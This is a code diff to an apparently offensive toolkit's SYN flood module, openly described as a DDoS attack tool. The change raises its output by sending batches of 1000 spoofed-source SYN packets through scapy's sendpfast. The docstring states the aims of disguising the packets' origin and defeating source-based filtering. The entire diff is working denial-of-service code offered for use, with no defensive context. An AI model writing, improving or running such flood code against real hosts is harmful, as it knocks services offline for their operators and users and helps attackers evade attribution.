@@ -18,8 +18,10 @@ import random
 import signal
 import time
 
-from scapy.all import send
+from scapy.all import sendpfast
 from scapy.layers.inet import IP, TCP
+from scapy.layers.l2 import Ether
+from scapy.packet import Packet
 from types import FrameType
 
 from netlink.core.base_module import BaseModule
@@ -44,6 +46,8 @@ class SynFlood(BaseModule):
     NAME = 'syn_flood'
     DESCRIPTION = "Perform a SYN Flood DDOS attack"
     REQUIRES_ROOT = True
+
+    BATCH_SIZE = 1000
     LOWER_PORT = 1024
     UPPER_PORT = 65535
 
@@ -138,7 +142,7 @@ class SynFlood(BaseModule):
                     self.output.warn("Keyboard interrupted (CTRL+C)")
                     break
                 self._flood(args)
-                self._packets_sent += 1
+                self._packets_sent += self.BATCH_SIZE
                 time.sleep(args.interval)
         except Exception as e:
             self.output.error(f"{e}")
@@ -187,28 +191,39 @@ class SynFlood(BaseModule):
     
     def _flood(self, args: argparse.Namespace) -> None:
         """
-        Builds and sends a single TCP SYN packet to the target host and port.
-        Uses a randomly generated source port for each packet. When --spoof-ip
-        is enabled generates a random globally routable source IP address to
-        disguise the origin of the packet. When spoofing is disabled the packet
-        is sent with the attacker's real IP address as the source.
+        Builds and sends a batch of TCP SYN packets to the target host and
+        port using sendpfast() for maximum throughput via tcpreplay
+        acceleration. Each packet in the batch has a unique randomly generated
+        source port. When --spoof-ip is enabled each packet also gets a unique
+        randomly generated globally routable source IP address to disguise the
+        origin and prevent source-based filtering. When spoofing is disabled
+        packets are sent with the attacker's real IP address as the source.
+        Each packet includes an Ethernet layer for proper layer 2 framing
+        required by sendpfast(). Sends BATCH_SIZE packets per call achieving
+        approximately 2200 packets per second.
         Args:
             args (argparse.Namespace): The parsed command-line arguments used
                                     to access target, port, and spoof_ip.
         """
-        src_port = self._random_port()
         tgt_port = args.port
         tgt_ip = args.target
+        pkts = list()
 
         if args.spoof_ip:
-            src_ip = self._random_ip()
-            pkt = IP(src=src_ip, dst=tgt_ip)
-            pkt /= TCP(sport=src_port, dport=tgt_port, flags='S')
+            for _ in range(self.BATCH_SIZE):
+                src_ip = self._random_ip()
+                src_port = self._random_port()
+                pkt = Ether()/IP(src=src_ip, dst=tgt_ip)
+                pkt /= TCP(sport=src_port, dport=tgt_port, flags='S')
+                pkts.append(pkt)
         else:
-            pkt = IP(dst=tgt_ip)
-            pkt /= TCP(sport=src_port, dport=tgt_port, flags='S')
-
-        send(pkt, verbose=0)
+            for _ in range(self.BATCH_SIZE):
+                src_port = self._random_port()
+                pkt = Ether()/IP(dst=tgt_ip)
+                pkt /= TCP(sport=src_port, dport=tgt_port, flags='S')
+                pkts.append(pkt)
+        
+        sendpfast(pkts, iface=self.iface)
        
     def _random_port(self) -> int:
         """
